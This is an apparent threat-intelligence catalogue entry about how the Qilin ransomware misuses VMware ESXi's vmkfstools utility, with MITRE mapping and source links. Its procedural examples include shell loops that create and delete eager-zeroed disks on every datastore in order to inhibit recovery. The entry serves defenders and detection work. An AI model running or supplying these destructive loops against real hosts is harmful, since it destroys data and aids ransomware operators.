---
Name:  vmkfstools
Description: A command-line utility in VMware ESXi used to manage and interact with VMFS (Virtual Machine File System) volumes.
Author: 'Janantha Marasinghe @blueteam0ps_'
Created: 2024-08-27
Commands:
  - Command: vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk > /dev/null
    Description: Create eager-zeroed thick virtual disk at the specified location without displaying any output.
    Usecase: Adversary uses vmfstools to create and immediately delete a 10MB eager zeroed thick disk on every datastore on the ESXi host. This will effectively overwrite contents of the disk.
    Category: Inhibit Recovery
    Privileges: Administrator
    MitreID: T1561.001
    OperatingSystem: ESXi  
    Tags:
     - E-Crime: Qilin
    ProceduralExamples:
     - for I in $(esxcli storage filesystem list |grep 'VMFS-5' |awk '{print $1}'); do vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk > /dev/null; vmkfstools -U $I/eztDisk > /dev/null; done
     - for I in $(esxcli storage filesystem list |grep 'VMFS-6' |awk '{print $1}'); do vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk > /dev/null; vmkfstools -U $I/eztDisk > /dev/null; done
Full_Path:
  - Path: /sbin/vmkfstools
  - Path: /bin/vmkfstools
Resources:
  - Link: https://www.bleepingcomputer.com/news/security/linux-version-of-qilin-ransomware-focuses-on-vmware-esxi/
  - Link: https://www.shadowstackre.com/analysis/qilin
Acknowledgement:
  - Person: Lawrence Abrams
  - Person: MalwareHunterTeam
    Handle: '@malwarehunterteam'
---
